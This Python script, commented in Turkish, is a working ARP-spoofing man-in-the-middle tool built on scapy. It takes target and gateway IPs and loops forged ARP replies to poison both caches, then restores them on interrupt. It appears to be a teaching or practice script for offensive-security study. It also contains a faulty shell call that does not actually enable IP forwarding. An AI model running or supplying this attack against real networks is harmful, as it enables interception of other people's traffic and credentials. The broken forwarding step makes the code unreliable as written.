# Man in the Middle
import subprocess
import scapy.all as scapy
import time
import optparse


def get_user_inputs():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip")
    parser.add_option("-g", "--gateway", dest="gateway_ip")
    options = parser.parse_args()[0]
    if not options.target_ip:
        print("Enter target ip")
    if not options.gateway_ip:
        print("Enter gateway ip")
    return options


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)  # arp paketimizi oluşturuyoruz
    # scapy.ls(scapy.ARP()) # -> scapy içindeki method. içine verdiğimiz instance için parametreleri gösterir

    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')  # broadcast paketi oluşturduk

    combined_packet = broadcast_packet / arp_request_packet  # 2 paketi tek paket haline getir dedik

    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[
        0]  # paketi yolluyoruz. timeout -> 1 sn bekle cevap gelmezse bekleme devam et dedik
    return answered_list[0][1].hwsrc  # mac adresini aldık


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    subprocess.call(["echo", "1", ">",
                     "/proc/sys/net/ipv4/ip_forward"])  # mitm saldırıları yaparken ipforward'ı etkin hale getiriyoruz.

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                             psrc=poisoned_ip)  # pdst -> hedef bilgisayarın ip'si, hwdst -> hedef mac adresi
    scapy.send(arp_response, verbose=False)  # verbose = False -> durum raporu yazdırmasını engeller


def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    subprocess.call(["echo", "1", ">",
                     "/proc/sys/net/ipv4/ip_forward"])  # mitm saldırıları yaparken ipforward'ı etkin hale getiriyoruz.
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac,
                             psrc=gateway_ip,
                             hwsrc=gateway_mac)  # pdst -> hedef bilgisayarın ip'si, hwdst -> hedef mac adresi
    scapy.send(arp_response, verbose=False, count=8)  # verbose = False -> durum raporu yazdırmasını engeller
    # count = 8 -> 8 paket yolla dedik


number = 0
user_ips = get_user_inputs()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
try:
    while True:
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print("\rSending packets! " + str(number),
              end=" ")  # -> aynı satır içerisinde kal ve satırın sonuna hiç bir şey ekleme dedik
        time.sleep(2)
except KeyboardInterrupt:
    print("Program kapatıldı...\nPaketler başarıyla gönderildi!\nReset atıldı!")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
